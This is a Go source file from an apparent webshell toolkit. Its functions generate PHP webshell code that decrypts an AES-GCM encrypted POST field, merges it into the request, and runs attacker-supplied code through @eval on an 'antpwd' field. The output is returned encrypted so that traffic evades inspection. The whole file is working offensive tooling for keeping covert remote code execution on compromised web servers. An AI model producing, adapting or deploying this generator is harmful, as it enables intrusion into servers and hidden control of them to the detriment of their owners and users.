package php

import (
	"github.com/Yliken/redbeanshellcore/crypto/fragment"
)

const (
	// DefaultCryptoField is the form field carrying the encrypted body.
	DefaultCryptoField = "__crypto"
	// DefaultEvalField is the form field carrying the original PHP eval payload.
	DefaultEvalField = "antpwd"
)

// CryptoShellOptions configures the eval-style encrypted PHP shell.
type CryptoShellOptions struct {
	// CryptoField is the POST field holding the encrypted body.
	CryptoField string
	// EvalField is the POST field holding the original eval payload.
	EvalField string
	// Fragment overrides the crypto implementation used by the shell.
	Fragment fragment.Fragment
}

// DefaultCryptoShellOptions returns the standard shell configuration.
func DefaultCryptoShellOptions() CryptoShellOptions {
	return CryptoShellOptions{CryptoField: DefaultCryptoField, EvalField: DefaultEvalField}
}

// CryptoShellSource generates an eval-style AES-GCM encrypted PHP shell.
// The shell decrypts the __crypto field, restores it with parse_str, merges
// the result into $_POST, then executes the original eval template unchanged.
func CryptoShellSource(key []byte) string {
	return CryptoShellSourceWith(key, DefaultCryptoShellOptions())
}

// CryptoShellSourceWith generates the encrypted PHP shell with custom options.
func CryptoShellSourceWith(key []byte, opts CryptoShellOptions) string {
	frag := opts.Fragment
	if frag == nil {
		frag, _ = fragment.NewAESGCM(key)
	}
	if frag == nil {
		frag = &fragment.AESGCM{Key: key}
	}

	cryptoField := opts.CryptoField
	if cryptoField == "" {
		cryptoField = DefaultCryptoField
	}
	evalField := opts.EvalField
	if evalField == "" {
		evalField = DefaultEvalField
	}

	return "<?php\n" +
		frag.DecryptPHP() + "\n" +
		frag.EncryptPHP() + "\n" +
		"if(isset($_POST['" + cryptoField + "'])){\n" +
		"$__rbs_p=__rbs_decrypt($_POST['" + cryptoField + "']);\n" +
		"parse_str($__rbs_p,$__rbs_req);\n" +
		"if(is_array($__rbs_req)){$_POST=array_merge($_POST,$__rbs_req);}\n" +
		"}\n" +
		"ob_start();\n" +
		"@eval($_POST['" + evalField + "']);\n" +
		"$__rbs_o=ob_get_clean();\n" +
		"echo __rbs_encrypt($__rbs_o);\n" +
		"?>"
}

// CryptoShellMeta returns the crypto mode and key fingerprint used by a shell
// generated from the given key. Client factories use this to validate that the
// deployed shell matches the client configuration.
func CryptoShellMeta(key []byte) (mode string, fingerprint string) {
	frag, err := fragment.NewAESGCM(key)
	if err != nil {
		frag = &fragment.AESGCM{Key: key}
	}
	return frag.Name(), frag.KeyFingerprint()
}
